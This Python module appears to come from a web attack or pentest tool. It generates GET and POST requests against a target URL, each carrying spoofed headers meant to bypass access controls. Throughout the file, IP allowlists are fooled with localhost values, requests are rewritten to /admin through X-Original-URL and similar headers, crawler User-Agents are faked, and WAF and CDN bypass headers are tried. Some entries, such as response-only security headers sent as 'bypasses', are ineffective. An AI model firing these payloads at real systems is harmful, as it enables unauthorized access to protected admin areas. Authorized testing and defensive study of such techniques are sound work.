#!/usr/bin/env python3
"""
Header injection bypass techniques
"""

import random
import string

class HeaderInjection:
    def __init__(self, manager):
        self.manager = manager
        
    def get_tests(self):
        """Generate header injection tests"""
        tests = []
        base_url = self.manager.target_url
        
        # Common injection headers
        injection_headers = [
            # X-Forwarded-* variants
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': '0.0.0.0'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Forwarded-For': '::1'},
            {'X-Forwarded-For': '127.0.0.1, 10.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1, 192.168.1.1'},
            {'X-Forwarded-For': '127.0.0.1, 172.16.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Forwarded-Host': '127.0.0.1'},
            {'X-Forwarded-Host': 'example.com'},
            {'X-Forwarded-Server': 'localhost'},
            {'X-Forwarded-Server': '127.0.0.1'},
            {'X-Forwarded-Proto': 'http'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Forwarded-Scheme': 'http'},
            {'X-Forwarded-Scheme': 'https'},
            
            # IP spoofing headers
            {'Client-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            
            # Host spoofing
            {'Host': 'localhost'},
            {'Host': '127.0.0.1'},
            {'Host': '0.0.0.0'},
            {'Host': 'internal'},
            {'Host': 'example.com'},
            {'X-Original-Host': 'localhost'},
            {'X-Original-Host': '127.0.0.1'},
            {'X-Forwarded-Server': 'localhost'},
            {'X-Forwarded-Host': 'localhost'},
            
            # Authentication bypass
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Override-URL': '/admin'},
            {'X-Forwarded-URL': '/admin'},
            {'X-Original-URI': '/admin'},
            {'X-Override-URI': '/admin'},
            
            # Custom authorization
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-ProxyUser-Ip': '127.0.0.1'},
            {'X-User-IP': '127.0.0.1'},
            {'X-IP-Authorization': '127.0.0.1'},
            
            # Referer bypass
            {'Referer': 'https://google.com'},
            {'Referer': 'https://www.google.com'},
            {'Referer': 'https://bing.com'},
            {'Referer': 'https://facebook.com'},
            {'Referer': 'http://localhost'},
            {'Referer': 'http://127.0.0.1'},
            
            # Origin bypass
            {'Origin': 'https://google.com'},
            {'Origin': 'https://example.com'},
            {'Origin': 'null'},
            {'Origin': 'http://localhost'},
            
            # User-Agent spoofing
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'},
            
            # Accept-Encoding bypass
            {'Accept-Encoding': 'gzip, deflate, br'},
            {'Accept-Encoding': 'identity'},
            {'Accept-Encoding': '*'},
            
            # Cache bypass
            {'Cache-Control': 'no-cache'},
            {'Cache-Control': 'no-store'},
            {'Cache-Control': 'max-age=0'},
            {'Pragma': 'no-cache'},
            {'Expires': '0'},
            
            # Connection headers
            {'Connection': 'close'},
            {'Connection': 'keep-alive'},
            {'Connection': 'upgrade'},
            
            # Range bypass
            {'Range': 'bytes=0-1024'},
            {'Range': 'bytes=1024-2048'},
            {'If-Range': 'bytes=0-1024'},
            
            # CDN bypass
            {'CF-Connecting-IP': '127.0.0.1'},
            {'CF-IPCountry': 'US'},
            {'CloudFront-Forwarded-Proto': 'http'},
            {'CloudFront-Is-Desktop-Viewer': 'true'},
            {'X-Akamai-Transformed': '1'},
            {'Fastly-Client-IP': '127.0.0.1'},
            
            # Security headers bypass
            {'X-Content-Type-Options': 'nosniff'},
            {'X-Frame-Options': 'allowall'},
            {'X-XSS-Protection': '0'},
            {'Content-Security-Policy': 'default-src *'},
            
            # WAF bypass
            {'X-WAF-IP': '127.0.0.1'},
            {'X-WAF-Bypass': '1'},
            {'X-Whitelist': '127.0.0.1'},
        ]
        
        # Test each header injection
        for headers in injection_headers:
            tests.append({
                'name': f'Header Injection: {list(headers.keys())[0]}={list(headers.values())[0]}',
                'url': base_url,
                'headers': headers,
                'method': 'GET'
            })
            
            # Also test with POST
            tests.append({
                'name': f'Header Injection POST: {list(headers.keys())[0]}={list(headers.values())[0]}',
                'url': base_url,
                'headers': headers,
                'method': 'POST'
            })
        
        # Header combinations
        header_combinations = [
            [
                {'X-Forwarded-For': '127.0.0.1'},
                {'X-Forwarded-Host': 'localhost'},
                {'X-Original-URL': '/admin'}
            ],
            [
                {'Client-IP': '127.0.0.1'},
                {'X-Remote-IP': '127.0.0.1'},
                {'Referer': 'https://google.com'}
            ],
            [
                {'Host': 'localhost'},
                {'Cache-Control': 'no-cache'},
                {'User-Agent': 'Googlebot'}
            ],
        ]
        
        for combo in header_combinations:
            combined_headers = {}
            for headers in combo:
                combined_headers.update(headers)
            
            tests.append({
                'name': f'Header Combo: {len(combo)} headers',
                'url': base_url,
                'headers': combined_headers,
                'method': 'GET'
            })
        
        return tests
